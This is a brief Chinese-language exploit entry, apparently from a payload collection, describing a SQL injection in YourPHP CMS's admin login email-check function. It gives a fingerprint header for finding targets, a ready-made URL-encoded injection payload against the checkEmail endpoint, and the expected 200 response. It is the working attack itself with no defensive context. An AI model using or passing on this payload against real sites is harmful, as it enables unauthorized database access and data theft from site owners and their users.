# yourphpcmsemailsql注入漏洞

yourphpcmsemailsql ｜ SQL注入 ｜ —
- **指纹**：`header="YP_onlineid"`

**Payload**
```
/index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=-3426%27%20OR%201=2%20AND%20%27RYHI%27=%27RYHI
```
- **响应特征**：200